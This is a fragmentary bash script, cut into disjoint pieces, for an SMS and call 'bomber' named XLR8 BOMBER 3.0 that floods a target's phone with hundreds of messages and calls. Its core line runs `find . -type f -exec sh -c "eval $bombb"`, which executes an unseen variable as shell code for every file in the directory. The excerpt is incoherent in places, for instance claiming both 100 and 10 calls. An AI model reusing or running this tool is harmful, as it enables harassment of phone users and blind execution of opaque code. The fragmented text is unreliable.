...
#------------------------------------------------------#
#                   XLR8 BOMBER 3.0 !                  #
#               Coded by MANAS ARORA               #
#~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ #
#      Github     :   github.com/manasarora123
#
#       
#------------------------------------------------------#
...
echo ""
sleep 1
echo "                                    $WHITE Author:$RED MANAS ARORA"
echo ""
...
output=$(cat .output.txt | grep "HELLO")
if [[ $output = "Fuck you" ]]
then
...
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 600 msgs and 100 calls !!\e[93m"
echo ""
echo ""
find . -type f -exec sh -c "eval $bombb" \;
printf "          \e[0m\e[41m♡ 600 msgs and 10 calls Bombed Successfully ♡\e[0m\n"
echo ""
exit
else
echo ""
